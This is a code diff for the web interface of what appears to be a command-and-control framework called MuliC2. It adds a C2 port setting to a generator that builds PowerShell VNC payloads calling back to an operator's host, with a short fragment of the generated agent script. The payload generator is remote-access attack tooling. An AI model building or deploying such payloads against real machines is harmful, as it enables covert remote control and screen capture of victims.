@@ -284,6 +284,15 @@
               
               <el-row :gutter="20">
                 <el-col :span="12">
+                  <el-form-item label="C2 Port:">
+                    <el-input v-model="vncForm.c2Port" placeholder="443" />
+                    <span class="form-help">C2 server port (default: 443)</span>
+                  </el-form-item>
+                </el-col>
+              </el-row>
+              
+              <el-row :gutter="20">
+                <el-col :span="12">
                   <el-form-item label="Payload Type:">
                     <el-select v-model="vncForm.payloadType" placeholder="Select payload type">
                       <el-option label="PowerShell" value="powershell" />
@@ -322,6 +331,7 @@
             <div class="vnc-info">
               <p><strong>LHOST:</strong> {{ vncForm.lhost }}</p>
               <p><strong>LPORT:</strong> {{ vncForm.lport }}</p>
+              <p><strong>C2 Port:</strong> {{ vncForm.c2Port }}</p>
               <p><strong>Type:</strong> {{ vncForm.payloadType }}</p>
               <p><strong>Loader:</strong> {{ vncForm.useLoader ? 'Enabled' : 'Disabled' }}</p>
               <p><strong>Generated:</strong> {{ new Date().toLocaleString() }}</p>
@@ -372,11 +382,11 @@
                 <el-button type="primary" @click="startVncViewer" :disabled="vncViewerActive">
                   <el-icon><VideoPlay /></el-icon>
                   Start Viewer
-                </el-button>
+                  </el-button>
                 <el-button type="warning" @click="stopVncViewer" :disabled="!vncViewerActive">
                   <el-icon><VideoPause /></el-icon>
                   Stop Viewer
-                </el-button>
+      </el-button>
                 <el-button type="success" @click="captureScreenshot" :disabled="!vncViewerActive">
                   <el-icon><Camera /></el-icon>
                   Capture Screenshot
@@ -385,7 +395,7 @@
                   <el-icon><FullScreen /></el-icon>
                   Fullscreen
                 </el-button>
-              </div>
+          </div>
               
               <div class="vnc-settings">
                 <el-form :model="vncSettings" label-width="120px" size="small">
@@ -396,7 +406,7 @@
                     <el-input-number v-model="vncSettings.fpsLimit" :min="1" :max="30" :step="1" />
                   </el-form-item>
                 </el-form>
-              </div>
+        </div>
             </div>
             
             <div v-if="vncViewerActive" class="vnc-display">
@@ -408,8 +418,8 @@
                   <span>Frame: {{ vncFrameCount }}</span>
                 </div>
               </div>
-            </div>
-            
+    </div>
+
             <div v-if="!vncConnected" class="vnc-waiting">
               <el-empty description="Waiting for VNC Agent Connection">
                 <template #description>
@@ -419,7 +429,7 @@
               </el-empty>
             </div>
           </div>
-        </div>
+    </div>
       </el-tab-pane>
     </el-tabs>
 
@@ -597,6 +607,7 @@ const creatingListener = ref(false)
 const vncForm = ref({
   lhost: '',
   lport: '5900',
+  c2Port: '443', // C2 server port
   payloadType: 'powershell',
   useLoader: true
 })
@@ -927,17 +938,17 @@ const disconnectAgent = async (agent: any) => {
 
 // VNC Payload Generator Functions
 const generateVncPayload = async () => {
-  if (!vncForm.value.lhost || !vncForm.value.lport) {
-    ElMessage.error('Please provide LHOST and LPORT')
+  if (!vncForm.value.lhost || !vncForm.value.lport || !vncForm.value.c2Port) {
+    ElMessage.error('Please provide LHOST, LPORT, and C2 Port')
     return
   }
   
   generatingVnc.value = true
   
   try {
-    // Use the LHOST as the C2 server and a default C2 port
+    // Use the LHOST as the C2 server and get the C2 port from the form
     const c2Host = vncForm.value.lhost
-    const c2Port = 8443 // Default C2 port from config
+    const c2Port = vncForm.value.c2Port || 443 // Use form value or default to 443
     const vncPort = vncForm.value.lport
     
     console.log('VNC Configuration:', { c2Host, c2Port, vncPort })
@@ -1197,7 +1208,7 @@ try {
 } catch {
     Write-Host "[!] Connection error: \$(\$_.Exception.Message)" -ForegroundColor Red
     Write-Host "[!] Make sure the MuliC2 listener is running on \$C2Host\`:\$C2Port" -ForegroundColor Red
-} finally {
+  } finally {
     # Final cleanup
     if (-not \$global:cleanupInProgress) {
         Invoke-GracefulCleanup \$true
@@ -1377,6 +1388,7 @@ const clearVncForm = () => {
   vncForm.value = {
     lhost: '',
     lport: '5900',
+    c2Port: '443', // C2 server port
     payloadType: 'powershell',
     useLoader: true
   }
@@ -1390,6 +1402,7 @@ const autoFillVncFromConfig = () => {
   if (activeProfile) {
     vncForm.value.lhost = window.location.hostname || 'localhost'
     vncForm.value.lport = '5900' // Default VNC port
+    vncForm.value.c2Port = activeProfile.port.toString() // Set C2 port from profile
     ElMessage.success(`Auto-filled using ${activeProfile.name} (Port: ${activeProfile.port})`)
   } else {
     ElMessage.warning('No active TLS profiles found. Please check your C2 configuration.')
